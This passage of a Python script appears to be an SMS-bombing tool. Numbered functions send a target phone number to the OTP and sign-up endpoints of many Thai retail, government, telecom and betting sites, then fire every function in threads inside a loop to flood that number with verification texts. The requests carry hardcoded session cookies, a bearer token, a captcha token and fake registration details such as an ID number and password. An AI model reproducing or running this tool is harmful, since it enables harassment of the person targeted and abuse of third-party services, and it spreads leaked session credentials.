    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "accept": "*/*",
    "origin": "https://m.globalhouse.co.th",
    "referer": "https://m.globalhouse.co.th/"
            }
    requests.post("https://api-globalhouse.com/sms/requestOTP",headers=head,json={"phonNumber":phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api28():
    requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api29():
    head = {
            "Host": "www.bigthailand.com",
            "content-length": "136",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "sec-ch-ua-platform": "Android",
            "origin": "https://www.bigthailand.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.bigthailand.com/login",
            "cookie": "_gcl_au=1.1.723820426.1643691945;_ac_au_gt=1643691945634;_asm_uid=653773101;_fbp=fb.1.1643691957383.1644253645;_ac_client_id=653773209.1643691970;au_id=653773209;_asm_visitor_type=r;_hjSessionUser_2738378=eyJpZCI6IjI0ZjBjOGNhLTVjZWEtNWE3Ni04OWZkLWUyNGU0MWUzOTlhNiIsImNyZWF0ZWQiOjE2NDM2OTE5NTY4MDYsImV4aXN0aW5nIjp0cnVlfQ==;_gac_UA-165856282-1=1.1644738470.Cj0KCQiArt6PBhCoARIsAMF5waj_hkCe4-BkzDT30pB0B3qwe_xKwd2_LtX7E8DgYtiVeUQuLoUjtU8aAub2EALw_wcB;_gcl_aw=GCL.1645120161.CjwKCAiAgbiQBhAHEiwAuQ6Bkp20RyIPMOeEY-ScfXQ4f3nvC_nShMvJZuI58c7afoEYwoA9aksfBhoCdNMQAvD_BwE;auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..f59OD99kZxkzEkQk4x1EPQ.RiF8qhzt7JieP5hextin0Y9P8V9qPKUCwlm93Tvu3XVKAGvp0LiHjKddlD6vMXJ3M4tVLWCbAzQ865V9v-9c_lP_SjC9HoL9tP0xtBFE3c3NxXKbuBsyMU7lEPTrKPdpk9ZICR43PC4tSE3TCeHFDA.0BpR9DJqgK9iNYAV6YtaCA;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUuY29tIiwibWVkaXVtIjoicmVmZXJyZXIiLCJjYW1wYWlnbiI6IiIs%0D%0AImNvbnRlbnQiOiIiLCJ0ZXJtIjoiIiwidHlwZSI6InJlZmVycmVyIiwidGltZSI6MTY0NTUzNDg1%0D%0ANTM5NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExtTnZiUzF5WldabGNuSmxjaTB0TVRZME5UVXpORGcx%0D%0ATlRNNU5RPT0ifQ%3D%3D;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1645534855%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;cdp_session=1;_ga=GA1.2.856661019.1643691948;_gid=GA1.2.60066855.1645534859;popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-02-22T13%3A31%3A00.469Z%22%7D;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6IjBhZTZjOGRlLTQ0YzAtNDA0OS1hNjU4LTZmMjE1MzIyMjg1NyIsImNyZWF0ZWQiOjE2NDU1MzQ4NzE1NjIsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjCachedUserAttributes=eyJhdHRyaWJ1dGVzIjp7fSwidXNlcklkIjoiMjczODM3OCJ9;_ga_80VN88PBVD=GS1.1.1645534855.4.1.1645534873.42;OptanonConsent=isIABGlobal=false&datestamp=Tue+Feb+22+2022+20%3A01%3A14+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=41be2439-a8b7-4bc6-a2ee-4db6f745322a&interactionCount=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1&AwaitingReconsent=false;_pk_id.564990563.2c0e=653773209.1643691945.4.1645534877.1645534855.;_ac_an_session=znzmzgzlzrznzrzmzqznzdzjzdzizlznzmzmzgznzrzkzkzdzizdzizlznzmzmzgznzrzkzkzdzizlznzmzmzgznzrzkzkzdzizdzgzjzizdzjzd2h25zdzgzdzezizd"
            }
    requests.post("https://www.bigthailand.com/authentication-service/user/OTP",headers=head,json={"locale":"th","phone":f"+66{phone[1:]}","email":"gtav2@gmail.com","userParams":{"buyerName":"aimbot god","activateLink":"www.google.com"}})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api30():
    requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api31():
    requests.post("https://play.gkingbet.com/api/register/sms",json={"phone":phone,"agent_id":5,"country_code":"TH"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api32():
    requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api33():
    requests.post('http://m.thaiuang.com/uc/authcode/sms/get/reg/'+phone)
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api34():
    requests.post('https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp',json={"mobile_phone_no":phone},headers={'user-agent':'Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api35():
    requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api36():
    requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api37():
    requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api38():
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api39():
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
        }
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api40():
    requests.post("http://b226.com/x/code", data={f"phone":phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api41():
    requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone}) 
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api42():
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api43():
    requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api45():	 
    requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

for i in range(Num):
    threading.Thread(target=api1).start()
    threading.Thread(target=api2).start()
    threading.Thread(target=api3).start()
    threading.Thread(target=api4).start()
    threading.Thread(target=api5).start()
    threading.Thread(target=api6).start()
    threading.Thread(target=api7).start()
    threading.Thread(target=api8).start()
    threading.Thread(target=api9).start()
    threading.Thread(target=api10).start()
    threading.Thread(target=api11).start()
    threading.Thread(target=api12).start()
    threading.Thread(target=api13).start()
    threading.Thread(target=api14).start()
    threading.Thread(target=api15).start()
    threading.Thread(target=api16).start()
    threading.Thread(target=api17).start()
    threading.Thread(target=api18).start()
    threading.Thread(target=api19).start()
    threading.Thread(target=api20).start()
    threading.Thread(target=api21).start()
    threading.Thread(target=api22).start()
    threading.Thread(target=api23).start()
    threading.Thread(target=api24).start()
    threading.Thread(target=api25).start()
    threading.Thread(target=api26).start()
    threading.Thread(target=api27).start()
    threading.Thread(target=api28).start()
    threading.Thread(target=api29).start()
    threading.Thread(target=api30).start()
    threading.Thread(target=api31).start()
    threading.Thread(target=api32).start()
    threading.Thread(target=api33).start()
    threading.Thread(target=api34).start()
    threading.Thread(target=api35).start()
    threading.Thread(target=api36).start()
    threading.Thread(target=api37).start()
    threading.Thread(target=api38).start()
    threading.Thread(target=api39).start()
    threading.Thread(target=api40).start()
    threading.Thread(target=api41).start()
    threading.Thread(target=api42).start()
    threading.Thread(target=api43).start()
    threading.Thread(target=api45).start()